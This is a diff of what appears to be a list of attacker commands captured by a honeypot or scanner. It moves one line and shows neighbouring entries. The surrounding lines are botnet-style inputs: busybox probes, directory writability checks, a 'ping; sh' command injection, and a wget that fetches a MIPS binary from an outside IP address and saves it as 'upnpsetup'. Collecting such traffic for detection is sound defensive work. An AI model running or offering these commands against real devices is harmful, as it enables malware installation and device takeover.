@@ -129,6 +129,7 @@ uname -a ; echo 'vT'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x59\x45\x48\x50\x46\x54'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x59\x57\x4a\x58\x44\x50'
 User-Agent: python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.119.1.el7.x86_64
+echo 1 > /dev/null && cat /bin/echo
 lghkel
 ping; sh
 wget -nc http://45.87.174.8/k.php?a=mips,F4Y1MHNHN10C9X48H -O ./upnpsetup
@@ -201,7 +202,6 @@ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (
 User-Agent: python-requests/2.27.1
 cat /proc/mounts; /bin/busybox GSIVI
 cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\x45\x4c\x46'
-echo 1 > /dev/null && cat /bin/echo
 echo TELNET_TEST_OK
 grep -c ^processor /proc/cpuinfo
 ls -la /var/run/gcc.pid
